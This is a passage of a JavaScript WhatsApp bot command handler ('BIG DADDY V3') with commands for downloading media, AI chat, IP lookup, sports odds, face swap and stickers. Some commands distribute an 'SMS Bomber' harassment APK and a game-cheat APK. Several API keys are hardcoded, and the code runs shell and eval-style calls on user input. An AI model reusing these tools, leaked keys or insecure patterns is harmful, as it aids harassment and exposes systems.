    await handleAPKDownload(mediafireUrl, 'SMS Bomber');
}
break;

case 'ff_headshot': {
    if (!await isPremium(m.sender)) {
        return replyphistar('❌ *This Command Is for Premium Users Only*.');
    }
    const mediafireUrl = "https://www.mediafire.com/file/u39y4nus2g7dpyo/ff_headshot.apk/file";
    await handleAPKDownload(mediafireUrl, 'FF Headshot');
}
break;

case 'youtube': {
    if (!await isPremium(m.sender)) {
        return replyphistar('❌ *This Command Is for Premium Users Only*.');
    }
    const mediafireUrl = "https://www.mediafire.com/file/kuh6q7hbljsxkow/YouTube_v19.40.33.apk/file";
    await handleAPKDownload(mediafireUrl, 'YouTube');
}
break;

async function handleAPKDownload(mediafireUrl, appName) {
    try {
        const apiEndpoint = `https://api.agatz.xyz/api/mediafire?url=${encodeURIComponent(mediafireUrl)}`;
        const apiResponse = await axios.get(apiEndpoint);

        if (apiResponse.data.status === 200) {
            const fileData = apiResponse.data.data[0];
            await PhistarBotInc.sendMessage(m.chat, {
                document: { url: fileData.link },
                mimetype: 'application/vnd.android.package-archive',
                fileName: fileData.nama,
                caption: `📥 *File Name:* ${fileData.nama}\n*Size:* ${fileData.size}\n\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`*Error*: Unable to fetch the download link for "${appName}".`);
        }
    } catch (error) {
        console.error(`Error in ${appName} command:`, error.message);
        replyphistar(`*An error occurred while processing your request for "${appName}". Please try again later.*`);
    }
}



case 'logointro': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/free-logo-intro-video-maker-online-558.html`;

        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: BK9 },
                caption: `\n> Logo Intro Generated Successfully!`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}
case 'dragonball': {
    if (!text) return replyphistar(`Example: ${prefix + command} BIG DADDY`);

    try {
        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/create-dragon-ball-style-text-effects-online-809.html`;

        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Dragon Ball Logo Generated Successfully!`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate the Dragon Ball logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Dragon Ball logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'listcurrency': {
    axios.get('https://api.exchangerate-api.com/v4/latest/USD')
        .then(response => {
            const currencies = Object.keys(response.data.rates);
            const currencyList = currencies.join(', ');
            replyphistar(`Supported Currencies: ${currencyList}`);
        })
        .catch(() => replyphistar('❌ Could not retrieve the list of currencies. Please try again later.'));
    break;
}

case 'tinyurl': {
    if (!q) return replyphistar('❌ Provide a valid link to shorten.');

    const request = require('request');
    request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
        try {
            replyphistar(body);
        } catch (e) {
            replyphistar(`❌ Error: ${e}`);
        }
    });
    break;
}
case 'boostbass':
case 'bitcrush':
case 'deepvoice':
case 'loudmax':
case 'speedup':
case 'thicken':
case 'nightmode':
case 'rewind':
case 'cyborg':
case 'slowmo':
case 'chipmunk': {
    try {
        if (!m.quoted || !/audio|video/.test(m.quoted.mtype)) {
            return replyphistar(`Reply to an *audio or video* message with *${prefix + command}*`);
        }

        let set;
        if (command === 'boostbass') set = 'equalizer=f=54:width_type=o:width=2:g=20';
        if (command === 'bitcrush') set = 'acrusher=.1:1:64:0:log';
        if (command === 'deepvoice') set = 'atempo=1,asetrate=44500*2/3';
        if (command === 'loudmax') set = 'volume=12';
        if (command === 'speedup') set = 'atempo=1.63,asetrate=44100';
        if (command === 'thicken') set = 'atempo=1.6,asetrate=22100';
        if (command === 'nightmode') set = 'atempo=1.06,asetrate=44100*1.25';
        if (command === 'rewind') set = 'areverse';
        if (command === 'cyborg') set = "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75";
        if (command === 'slowmo') set = 'atempo=0.7,asetrate=44100';
        if (command === 'chipmunk') set = 'atempo=0.5,asetrate=65100';

        let media = await PhistarBotInc.downloadAndSaveMediaMessage(m.quoted);
        let out = getRandom(/video/.test(m.quoted.mtype) ? '.mp4' : '.mp3');

        // Video case
        if (/video/.test(m.quoted.mtype)) {
            exec(`ffmpeg -i ${media} -filter:a "${set}" -map 0:v -map 0:a -c:v copy -shortest ${out}`, async (err) => {
                fs.unlinkSync(media);
                if (err) {
                    fs.unlinkSync(out);
                    return replyphistar(`❌ FFmpeg Error: ${err.message}`);
                }
                let vid = fs.readFileSync(out);
                await PhistarBotInc.sendMessage(m.chat, { video: vid, mimetype: 'video/mp4' }, { quoted: m });
                fs.unlinkSync(out);
            });
        }

        // Audio case
        else if (/audio/.test(m.quoted.mtype)) {
            exec(`ffmpeg -i ${media} -filter:a "${set}" ${out}`, async (err) => {
                fs.unlinkSync(media);
                if (err) {
                    fs.unlinkSync(out);
                    return replyphistar(`❌ FFmpeg Error: ${err.message}`);
                }
                let aud = fs.readFileSync(out);
                await PhistarBotInc.sendMessage(m.chat, { audio: aud, mimetype: 'audio/mpeg' }, { quoted: m });
                fs.unlinkSync(out);
            });
        }
    } catch (e) {
        replyphistar('❌ An error occurred while processing the media. Please try again.');
    }
    break;
}
case 'predictions': 
case 'sureodd': 
case 'sureodds': {
    // List of multiple API keys
    const apiKeys = [
        '73338da37ce534482c87846eab310b6f',
        '0e633fb2254604579825c34f3639dce3',
        '4819be8d34033fc925862bf47d3a80c8'
    ];

    // Randomly pick an API key
    const randomApiKey = apiKeys[Math.floor(Math.random() * apiKeys.length)];

    // API URL with the randomly chosen key
    const apiUrl = `https://api.the-odds-api.com/v4/sports/soccer_epl/odds?apiKey=${randomApiKey}&regions=us`;

    try {
        await replyphistar('🔍 Fetching real sure odds...');

        const response = await axios.get(apiUrl);
        const matches = response.data.slice(0, 3); // Get top 3 sure odds

        if (!matches.length) {
            return replyphistar('❌ No sure odds available at the moment. Try again later.');
        }

        let message = "🔥 *Sure Odds (100% Analysis)* 🔥\n\n";
        matches.forEach(match => {
            message += `⚽ *Match:* ${match.home_team} vs ${match.away_team}\n`;
            message += `📊 *Odds:* ${match.bookmakers[0].markets[0].outcomes[0].price}\n`;
            message += `💰 *Best Bookmaker:* ${match.bookmakers[0].title}\n\n`;
        });

        replyphistar(message.trim());
    } catch (error) {
        console.error(error);
        replyphistar('❌ Failed to fetch real sure odds. Try again later.');
    }
    break;
}
case 'sports': {
    const menu = `*⚽ Sports Menu:*\n
1️⃣ .livescores - Get live scores of ongoing matches.
2️⃣ .fixtures <league> - View upcoming matches for a specific league.
3️⃣ .standings <league> - Check the league standings.
4️⃣ .sportsnews - Get the latest sports news.\n
Use these commands to stay updated with sports events!`;
    
    replyphistar(menu);
    break;
}

case 'livescores': {
    if (!isCreator) return replyphistar(mess.owner); // Fix: Proper condition placement

    try {
        const apiUrl = 'https://livescore6.p.rapidapi.com/matches/v2/list-live?Category=soccer';
        const apiKey = 'a5bf8cd433msh33c0811108517b2p1b77a6jsn4cd75f147bf8'; // Your API Key

        const response = await fetch(apiUrl, {
            method: 'GET',
            headers: {
                'X-RapidAPI-Key': apiKey,
                'X-RapidAPI-Host': 'livescore6.p.rapidapi.com',
            },
        });

        if (!response.ok) {
            return replyphistar("❌ Failed to fetch live scores. Please try again later.");
        }

        const data = await response.json();

        if (!data || !data.Stages || data.Stages.length === 0) {
            return replyphistar("❌ No live matches currently.");
        }

        let liveScores = "*⚽ Live Soccer Scores:*\n\n";
        data.Stages.forEach((stage) => {
            stage.Events.forEach((event) => {
                const home = event.T1?.[0]?.Nm || "Team 1";
                const away = event.T2?.[0]?.Nm || "Team 2";
                const score = `${event.Tr1 ?? 0} - ${event.Tr2 ?? 0}`; // Fix: Using nullish coalescing for safety
                liveScores += `🏟️ ${home} vs ${away}\n📊 *Score:* ${score}\n\n`;
            });
        });

        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: 'https://files.catbox.moe/xm02jo.jpg' },
            caption: liveScores.trim(),
        }, { quoted: m });

    } catch (error) {
        console.error("Error fetching live scores:", error);
        replyphistar("❌ An error occurred while fetching live scores. Please try again later.");
    }
    break;
}
case 'ffstalk': {
    if (!args[0]) return replyphistar('❌ Please provide a Free Fire ID. Example: .ffstalk 8533270051');

    const ffId = args[0];
    const apiUrl = `https://api.davidcyriltech.my.id/ffstalk?id=${ffId}`;

    try {
        const response = await axios.get(apiUrl);
        const data = response.data;

        if (!data.success) return replyphistar('❌ Failed to fetch data. Please check the ID and try again.');

        // Extract account details
        const {
            name, level, xp, region, likes, created_at, last_login, honor_score, 
            booyah_pass, BR_points, CS_points
        } = data.account;

        const guild = data.guild ? `\n🏴 Guild: ${data.guild.name} (Level: ${data.guild.level})` : '';

        const message = `
🎮 *Free Fire Profile* 🎮
━━━━━━━━━━━━━━━━━
👤 *Name:* ${name}
🆔 *ID:* ${ffId}
⭐ *Level:* ${level} (XP: ${xp})
🌍 *Region:* ${region}
👍 *Likes:* ${likes}
📅 *Created:* ${created_at}
⏳ *Last Login:* ${last_login}
🛡 *Honor Score:* ${honor_score}
🔥 *Booyah Pass:* ${booyah_pass}
🏆 *Battle Royale Points:* ${BR_points}
⚔️ *Clash Squad Points:* ${CS_points}
${guild}
━━━━━━━━━━━━━━━━━
    `;

        replyphistar(message);
    } catch (error) {
        console.error('FF Stalk Error:', error);
        replyphistar('❌ An error occurred while fetching data. Please try again later.');
    }
    break;
}
case 'trackip': {
    if (!text) return replyphistar(`*Example:* ${prefix + command} 112.90.150.204`);

    try {
        let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

        const formatIPInfo = (info) => {
            return `
*IP Information*
• IP: ${info.ip || 'N/A'}
• Success: ${info.success || 'N/A'}
• Type: ${info.type || 'N/A'}
• Continent: ${info.continent || 'N/A'}
• Continent Code: ${info.continent_code || 'N/A'}
• Country: ${info.country || 'N/A'}
• Country Code: ${info.country_code || 'N/A'}
• Region: ${info.region || 'N/A'}
• Region Code: ${info.region_code || 'N/A'}
• City: ${info.city || 'N/A'}
• Latitude: ${info.latitude || 'N/A'}
• Longitude: ${info.longitude || 'N/A'}
• Is EU: ${info.is_eu ? 'Yes' : 'No'}
• Postal: ${info.postal || 'N/A'}
• Calling Code: ${info.calling_code || 'N/A'}
• Capital: ${info.capital || 'N/A'}
• Borders: ${info.borders || 'N/A'}
• Flag:
  - Image: ${info.flag?.img || 'N/A'}
  - Emoji: ${info.flag?.emoji || 'N/A'}
  - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
• Connection:
  - ASN: ${info.connection?.asn || 'N/A'}
  - Organization: ${info.connection?.org || 'N/A'}
  - ISP: ${info.connection?.isp || 'N/A'}
  - Domain: ${info.connection?.domain || 'N/A'}
• Timezone:
  - ID: ${info.timezone?.id || 'N/A'}
  - Abbreviation: ${info.timezone?.abbr || 'N/A'}
  - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
  - Offset: ${info.timezone?.offset || 'N/A'}
  - UTC: ${info.timezone?.utc || 'N/A'}
  - Current Time: ${info.timezone?.current_time || 'N/A'}
`;
        };

        if (!res.success) throw new Error(`IP ${text} not found!`);

        await PhistarBotInc.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
        const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
        await delay(2000);
        replyphistar(formatIPInfo(res));
    } catch (e) {
        replyphistar(`Error: Unable to retrieve data for IP ${text}`);
    }
    break;
}
case 'get': {
    if (typeof text !== 'string' || !text.trim()) {
        return replyphistar(`Add Input (Link)\n\nExample: ${prefix + command} https://example.com`);
    }

    const isUrl = (url) => {
        return url.match(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/gi);
    };

    const urlMatch = isUrl(text);
    if (!urlMatch) {
        return replyphistar(`Invalid URL provided. Please provide a valid URL.\n\nExample: ${prefix + command} https://example.com`);
    }

    const url = urlMatch[0]; // Use the first match
    try {
        const res = await axios.get(url);
        if (!/json|html|plain/.test(res.headers['content-type'])) {
            return replyphistar(`The content type of the provided URL is not supported.\n\nSupported types: json, html, plain text.`);
        }

        replyphistar(util.format(res.data));
    } catch (e) {
        replyphistar(`Error fetching data from the provided URL: ${util.format(e.message)}`);
    }
}
break;
case 'llama': {
    if (!text) {
        replyphistar('Please Ask Llama AI Anything.');
        return;
    }

    try {
        const response = await axios.get('https://bk9.fun/ai/llama', {
            params: { q: text }
        });

        if (response.data.status) {
            const replyMessage = response.data.BK9;
            replyphistar(replyMessage);
        } else {
            replyphistar('Failed to get a response from Llama AI.');
        }
    } catch (error) {
        console.error('Error fetching from Llama API:', error);
        replyphistar('An error occurred while connecting to Llama AI. Please try again later.');
    }
    break;
}
case 'big-Daddy-ai': {
    if (!text) {
        replyphistar('Hello! How can I assist you today.');
        return;
    }

    try {
        const response = await axios.get('https://bk9.fun/ai/jeeves-chat2', {
            params: { q: text }
        });

        if (response.data.status) {
            const replyMessage = response.data.BK9;
            replyphistar(replyMessage);
        } else {
            replyphistar('Failed to get a response from Big Daddy AI.');
        }
    } catch (error) {
        console.error('Error fetching from Big Daddy ai:', error);
        replyphistar('An error occurred while connecting to Big Daddy Server. Please try again later.');
    }
    break;
}
case 'ngl': {
    if (!text || !text.includes('|')) {
        return replyphistar(`*Usage:* .ngl <username>|<message>\n\n*Example:* .ngl phista1|Hey bro!`);
    }

    try {
        // Parse the username and message
        const [username, message] = text.split('|').map(t => t.trim());

        if (!username || !message) {
            return replyphistar(`*Usage:* .ngl <username>|<message>\n\n*Example:* .ngl phistar1|Hello there!`);
        }

        // Construct the NGL link using the username
        const nglLink = `https://ngl.link/${username}`;

        // Call the NGL API
        const apiResponse = await axios.get(`https://api.siputzx.my.id/api/tools/ngl`, {
            params: { link: nglLink, text: message }
        });

        // Check API response
        if (apiResponse.status === 200 && apiResponse.data.status) {
            replyphistar(`✅ *Message Sent Successfully!*\n\n📩 Message: "${message}"\n🔗 NGL Username: ${username}`);
        } else {
            replyphistar(`❌ *Failed to send the message.* Please try again.`);
        }
    } catch (error) {
        console.error('Error in NGL command:', error);
        replyphistar(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
    break;
}
case 'download':
case 'dl': {
    if (!text) return replyphistar(`❌ Please provide a valid link.\n\n*Example:* ${prefix + command} <TikTok/Facebook/Instagram link>`);

    try {
        let apiUrl = "";
        let platform = "";

        // Detect platform from the link
        if (text.includes("tiktok.com")) {
            platform = "TikTok";
            apiUrl = `https://api.giftedtech.co.ke/api/download/tiktok?apikey=giftedtech&url=${encodeURIComponent(text)}`;
        } else if (text.includes("facebook.com") || text.includes("fb.watch")) {
            platform = "Facebook";
            apiUrl = `https://api.giftedtech.co.ke/api/download/facebook?apikey=giftedtech&url=${encodeURIComponent(text)}`;
        } else if (text.includes("instagram.com")) {
            platform = "Instagram";
            apiUrl = `https://api.giftedtech.co.ke/api/download/instadl?apikey=giftedtech&url=${encodeURIComponent(text)}`;
        } else {
            return replyphistar(`❌ Unsupported link. Please use a TikTok, Facebook, or Instagram video link.`);
        }

        // Fetch from GiftedTech API
        const { data } = await axios.get(apiUrl);

        if (data && data.success) {
            const videoInfo = data.result;

            if (!videoInfo.url) {
                return replyphistar(`❌ No download URL found in response.`);
            }

            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: videoInfo.url },
                mimetype: 'video/mp4',
                fileName: `${platform}_Video.mp4`,
                caption: `🎥 *Platform:* ${platform}\n*Title:* ${videoInfo.title || platform + " Video"}\n\n> Downloaded`
            }, { quoted: m });

        } else {
            replyphistar(`❌ Unable to fetch the video. Please check the URL and try again.\n\nResponse: ${JSON.stringify(data, null, 2)}`);
        }

    } catch (error) {
        console.error('Error in Download command:', error.message);
        replyphistar(`❌ An error occurred while processing your request. Please try again later.`);
    }
    break;
}
case 'instagram':
case 'ig':
case 'instadl': {
    if (!text) return replyphistar(`❌ Please provide an Instagram reel/video link.\n\nExample: ${prefix + command} <link>`);

    try {
        // ✅ GiftedTech Instagram download API
        const apiUrl = `https://api.giftedtech.co.ke/api/download/instadl?apikey=giftedtech&url=${encodeURIComponent(text)}`;
        const { data } = await axios.get(apiUrl);

        if (data && data.success) {
            const videoInfo = data.result;

            if (!videoInfo.url) {
                return replyphistar(`❌ No download URL found in response.`);
            }

            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: videoInfo.url },
                mimetype: 'video/mp4',
                fileName: `Instagram_Video.mp4`,
                caption: `🎥 *Title:* ${videoInfo.title || 'Instagram Video'}\n> Downloaded`
            }, { quoted: m });

        } else {
            replyphistar(`❌ Unable to fetch the Instagram video. Please check the URL and try again.\n\nResponse: ${JSON.stringify(data, null, 2)}`);
        }

    } catch (error) {
        console.error('Error in Instagram download:', error.message);
        replyphistar(`❌ An error occurred while processing your request. Please try again later.`);
    }
    break;
}
case 'tiktok':
case 'tt':
case 'tiktokdl': {
    if (!text) return replyphistar(`*Example*: ${prefix + command} <URL or Link>`);

    try {
        // ✅ GiftedTech TikTok download API
        const apiUrl = `https://api.giftedtech.co.ke/api/download/tiktok?apikey=giftedtech&url=${encodeURIComponent(text)}`;
        const { data } = await axios.get(apiUrl);

        if (data && data.success) {
            const videoInfo = data.result;

            if (!videoInfo.url) {
                return replyphistar(`❌ No download URL found in response.`);
            }

            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: videoInfo.url },
                mimetype: 'video/mp4',
                fileName: `TikTok_Video.mp4`,
                caption: `🎥 *Title:* ${videoInfo.title || 'TikTok Video'}\n> Generated`
            }, { quoted: m });

        } else {
            replyphistar(`❌ Failed to fetch the TikTok video. Please check the URL and try again.\n\nResponse: ${JSON.stringify(data, null, 2)}`);
        }
    } catch (error) {
        console.error("Error in TikTok Downloader:", error.message);
        replyphistar(`*An error occurred while downloading the TikTok video.*`);
    }
    break;
}

case 'facebook': {
    if (!text) return replyphistar(`❌ Please provide a Facebook video/reel link.\n\nExample: ${prefix + command} <link>`);

    try {
        // ✅ GiftedTech Facebook download API
        const apiUrl = `https://api.giftedtech.co.ke/api/download/facebook?apikey=giftedtech&url=${encodeURIComponent(text)}`;
        const { data } = await axios.get(apiUrl);

        if (data && data.success) {
            const videoInfo = data.result;

            if (!videoInfo.url) {
                return replyphistar(`❌ No download URL found in response.`);
            }

            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: videoInfo.url },
                mimetype: 'video/mp4',
                fileName: `Facebook_Video.mp4`,
                caption: `🎥 *Title:* ${videoInfo.title || 'Facebook Video'}\n> Downloaded`
            }, { quoted: m });

        } else {
            replyphistar(`❌ Unable to fetch the video. Please check the URL and try again.\n\nResponse: ${JSON.stringify(data, null, 2)}`);
        }

    } catch (error) {
        console.error('Error in Facebook download:', error.message);
        replyphistar(`❌ An error occurred while processing your request. Please try again later.`);
    }
    break;
}
    case 'diary': {
    const diary = loadDiary();
    const userId = m.sender;
    if (!args[0]) {
        const userDiary = diary[userId] || [];
        if (userDiary.length === 0) return replyphistar("Your diary is empty. Add entries with `.diary <entry>`");
        const diaryContent = userDiary.map((entry, i) => `${i + 1}. ${entry}`).join('\n');
        replyphistar(`📓 *Your Diary:*\n\n${diaryContent}`);
    } else {
        const entry = text.trim();
        if (!diary[userId]) diary[userId] = [];
        diary[userId].push(entry);
        saveDiary(diary);
        replyphistar(`✅ *Added to your diary:* "${entry}"`);
    }
    break;
}
case 'generate': {
    if (!text) {
        return replyphistar(`*Usage:* /generate <prompt>\n\n*Example:* /generate cat`);
    }

    try {
        // Call the Flux API
        const apiUrl = `https://api.davidcyriltech.my.id/flux?prompt=${encodeURIComponent(text)}`;
        
        // Send the generated image as a response
        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: apiUrl },
            caption: `🎨 *Big Daddy V3 Image Generator*\n\n📄 *Prompt:* ${text}`,
        }, { quoted: m });
    } catch (error) {
        console.error('Error in Flux command:', error);
        replyphistar(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
    break;
}
// Bot command example
case 'veo': {
  if (!text) return replyphistar('*Usage:* /veo <prompt>');

  try {
    const genId = await createVeoTask(text);
    await replyphistar('⏳ Generating video...');

    let result;
    while (true) {
      await new Promise((r) => setTimeout(r, 10000)); // wait 10 sec
      result = await fetchVideoUrl(genId);
      if (result.status === 'complete' && result.url) break;
    }

    await PhistarBotInc.sendMessage(m.chat, {
      video: { url: result.url },
      caption: `🎬 *Veo 3 Fast Result*\nPrompt: ${text}`,
    }, { quoted: m });
  } catch (error) {
    console.error('Veo Generation Error:', error);
    replyphistar(`*AN ERROR OCCURRED!!*\n\n> ${error.message}`);
  }
  break;
}
    case 'text2image': case 'textimg': case 'dalle': case 'magicstudio': {
    if (!text) {
        replyphistar('Please provide a prompt.');
        return;
    }

    try {
        const response = await axios.get('https://bk9.fun/ai/magicstudio', {
            params: { prompt: text },
            responseType: 'arraybuffer' // Ensures we handle the image data properly
        });

        const imageBuffer = Buffer.from(response.data, 'binary');

        // Send the image to the user
        await PhistarBotInc.sendMessage(m.chat, { image: imageBuffer, caption: `✨ Generated Image ✨` });
    } catch (error) {
        console.error('Error fetching from MagicStudio API:', error);
        replyphistar('An error occurred while generating the image. Please try again later.');
    }
    break;
}
    case 'ip': {
    if (!text) return replyphistar(`*Please provide an IP address!*\n\n*Example:* ${prefix + command} 8.8.8.8`);

    try {
        const apiResponse = await fetch(`https://endpoint.web.id/tools/cekip?key=gojou&id=${text}`);
        const ipv = await apiResponse.json();

        if (ipv.status) {
            const shannz = ipv.result;
            const tesk = `*[ IP CHECKER ]*\n\n` +
                         `> *IP:* ${shannz.ip}\n` +
                         `> *City:* ${shannz.city}\n` +
                         `> *Country:* ${shannz.country}\n` +
                         `> *Location:* ${shannz.loc}\n` +
                         `> *ORG:* ${shannz.org}\n` +
                         `> *Postal Code:* ${shannz.postal}\n` +
                         `> *Time Zone:* ${shannz.timezone}\n` +
                         `> *More Details:* ${shannz.readme}`;
            replyphistar(tesk);
        } else {
            replyphistar(`*❌ Error or IP not found! Please check the input and try again.*`);
        }
    } catch (error) {
        console.error('Error in IP Checker command:', error);
        replyphistar(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}
    case 'gemini2': {
    if (!text) {
        return replyphistar('❓ *Please provide a query for Gemini AI.*');
    }

    try {
        const response = await axios.get('https://bk9.fun/ai/gemini', {
            params: { q: text }
        });

        if (response.data.status) {
            const replyMessage = response.data.BK9;
            replyphistar(replyMessage);
        } else {
            replyphistar('❌ *Failed to get a response from Gemini AI.*');
        }
    } catch (error) {
        console.error('Error fetching from Gemini API:', error);
        replyphistar('❌ *An error occurred while connecting to Gemini AI. Please try again later.*');
    }
    break;
}
case 'gemini': {
    if (!text) {
        return replyphistar('❓ *Please provide a query for Gemini AI.*');
    }

    try {
        const response = await axios.get('https://bk9.fun/ai/acloudai', {
            params: { q: text }
        });

        if (response.data.status) {
            const replyMessage = response.data.BK9;
            replyphistar(replyMessage);
        } else {
            replyphistar('❌ *Failed to get a response from Gemini AI.*');
        }
    } catch (error) {
        console.error('Error fetching from Gemini API:', error);
        replyphistar('❌ *An error occurred while connecting to Gemini AI. Please try again later.*');
    }
    break;
}
case 'tempnumber': {
    replyphistar('🔍 Searching for available numbers randomly...');

    try {
        const countries = await getOnlineCountries(); // Fetch all online countries
        if (countries.length === 0) {
            replyphistar("❌ No online countries available at the moment.");
            break;
        }

        // Select a random country
        const randomCountry = countries[Math.floor(Math.random() * countries.length)];
        const numbers = await getCountryNumbers(randomCountry.name); // Fetch numbers for the random country

        if (numbers.length === 0) {
            replyphistar(`❌ No numbers available for ${randomCountry.name}.`);
            break;
        }

        // Select a random number from the country
        const randomNumber = numbers[Math.floor(Math.random() * numbers.length)];
        replyphistar(`📞 *Temporary Number Found:*\n\n🌍 *Country:* ${randomCountry.name}\n📱 *Number:* ${randomNumber.fullNumber}`);
    } catch (error) {
        console.error(error);
        replyphistar("❌ Failed to fetch temporary numbers. Please try again later.");
    }
    break;
}

case 'numberinbox': {
    const [country, number] = text.split('|');
    if (!country || !number) {
        return replyphistar("❓ Usage: .numberinbox <country>|<number>\nExample: .numberinbox Russia|123456789");
    }

    replyphistar(`📬 Checking inbox for number ${number} in ${country}...`);

    try {
        const inbox = await getNumberInbox(country.trim(), number.trim());
        if (!inbox || inbox.length === 0) {
            replyphistar(`📭 Inbox for ${number} in ${country} is empty or the number is offline.`);
        } else {
            const messages = inbox.map((msg, index) => `📩 *${index + 1}*. From: ${msg.sender}\n   Message: ${msg.text}`).join("\n\n");
            replyphistar(`📬 *Inbox for ${number}:*\n\n${messages}`);
        }
    } catch (error) {
        console.error(error);
        replyphistar("❌ Failed to fetch the inbox. Please check the number and try again.");
    }
    break;
}
case 'faceswap': {
    if (!quoted || !/image/.test(mime)) {
        return replyphistar(`*REQUEST ERROR!!*\n\n> Reply to an image with ${prefix}faceswap to initialize the process.`);
    }

    try {
        const mediaPath = await PhistarBotInc.downloadAndSaveMediaMessage(quoted);
        const uploadResponse = await uploadFile(mediaPath);

        if (!uploadResponse || !uploadResponse.url) {
            fs.unlinkSync(mediaPath);
            return replyphistar(`*UPLOAD ERROR!!*\n\n> Failed to upload the image.`);
        }

        const imageUrl = uploadResponse.url;

        if (!global.swapImage1) {
            global.swapImage1 = imageUrl;
            fs.unlinkSync(mediaPath);
            return replyphistar(`*FIRST IMAGE RECEIVED ✅*\n\n> Now reply with another image and use *${prefix}faceswap* again to swap faces.`);
        } else {
            const apiUrl = `https://api.siputzx.my.id/api/ai/faceswap?source=${global.swapImage1}&target=${imageUrl}`;
            global.swapImage1 = null;

            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: apiUrl },
                caption: `*FACE SWAP SUCCESSFUL! 🔥*`
            }, { quoted: m });

            fs.unlinkSync(mediaPath);
        }
    } catch (error) {
        console.error('FaceSwap Error:', error);
        replyphistar(`*PROCESSING ERROR!!*\n\n> ${error.message}`);
    }
    break;
}
// ================= STICKER SEARCH ================= //
case "stickers": {
    if (!text) return replyphistar(`Example: ${prefix + command} cat`);
    
    try {
        const anu = await stickersearch(text);
        const shuffledStickers = anu.sticker.sort(() => Math.random() - 0.5);
        const randomStickers = shuffledStickers.slice(0, 10);

        if (randomStickers.length > 0) {
            for (let i = 0; i < randomStickers.length; i++) {
                try {
                    await new Promise(resolve => setTimeout(resolve, i * 6000));
                    await PhistarBotInc.sendImageAsSticker(m.chat, randomStickers[i], m, {
                        packname: 'BIG DADDY V3 Stickers',
                        author: 'Phistar Network'
                    });
                } catch (error) {
                    console.error(`Phistar Sticker Error: ${error.message}`);
                    await replyphistar(`Failed to send sticker (${i + 1}/${randomStickers.length})`);
                }
            }
        }
    } catch (e) {
        console.error(e);
        replyphistar('❌ BIG DADDY V3 failed to process stickers');
    }
    break;
}

// ================= TRANSLATE ================= //
case "translate": {
    let lang, text;
    if (args.length >= 2) {
        lang = args[0] ? args[0] : 'id';
        text = args.slice(1).join(' ');
    } else if (m?.quoted?.text) {
        lang = args[0] ? args[0] : 'id';
        text = m.quoted.text;
    } else return replyphistar(`Example:\n${prefix + command} id Hello I'm BIG DADDY V3`);

    try {
        let res = await translate(text, { to: lang, autoCorrect: true });
        replyphistar(
            `*BIG DADDY V3 Translation*\n\n` +
            `🔍 *Detected:* ${res.from.language.iso.toUpperCase()}\n` +
            `🌐 *Target:* ${lang.toUpperCase()}\n\n` +
            `📝 *Original:* ${text}\n\n` +
            `💬 *Translation:* ${res.text}`
        );
    } catch (e) {
        replyphistar(`❌ Language "${lang}" not supported\nType ${prefix}languages for supported languages`);
    }
    break;
}

// ================= CALCULATOR ================= //
case "calculator": {
    try {
        const val = text
            .replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
            .replace(/×/g, '*')
            .replace(/÷/g, '/')
            .replace(/π|pi/gi, 'Math.PI')
            .replace(/e/gi, 'Math.E')
            .replace(/\/+/g, '/')
            .replace(/\++/g, '+')
            .replace(/-+/g, '-');

        const format = val
            .replace(/Math\.PI/g, 'π')
            .replace(/Math\.E/g, 'e')
            .replace(/\//g, '÷')
            .replace(/\*/g, '×');

        const result = (new Function('return ' + val))();
        
        if (!result) throw new Error('Invalid calculation');
        
        replyphistar(
            `🧮 *BIG DADDY V3 Calculator*\n\n` +
            `*Expression:* ${format}\n` +
            `*Result:* ${result}`
        );
    } catch (e) {
        replyphistar(
            `❌ Invalid calculation format\n` +
            `Only these symbols allowed:\n` +
            `0-9, +, -, *, /, ×, ÷, π, e, (, )`
        );
    }
    break;
}
case 'sticker':
case 'stiker':
case 's': {
    if (!quoted) return replyphistar(`Reply to an image or video with caption ${prefix + command}`);
    if (/image/.test(mime)) {
        const media = await quoted.download();
        await PhistarBotInc.sendImageAsSticker(m.chat, media, m, { 
            packname: 'BIG DADDY V3 ✨', 
            author: 'Phistar Official' 
        });
    } else if (/video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 11) return replyphistar('Maximum 10 seconds!');
        const media = await quoted.download();
        await PhistarBotInc.sendVideoAsSticker(m.chat, media, m, { 
